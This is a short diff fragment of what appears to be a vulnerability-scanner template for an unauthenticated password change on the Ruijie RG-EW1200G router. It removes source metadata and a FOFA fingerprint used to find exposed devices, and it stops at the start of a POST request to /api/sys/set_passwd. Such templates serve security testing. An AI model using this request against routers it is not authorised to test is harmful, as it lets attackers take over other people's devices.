@@ -3,14 +3,8 @@ info:
   name: 锐捷RG-EW1200G路由器未授权任意密码修改
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/9e3aa7d8273f498efa7dc37e186b15a2
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: unauth,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 9e3aa7d8273f498efa7dc37e186b15a2
-    fofa: body="/static/js/app.09df2a9e44ab48766f5f.js"
 http:
 - raw:
   - 'POST /api/sys/set_passwd HTTP/1.1
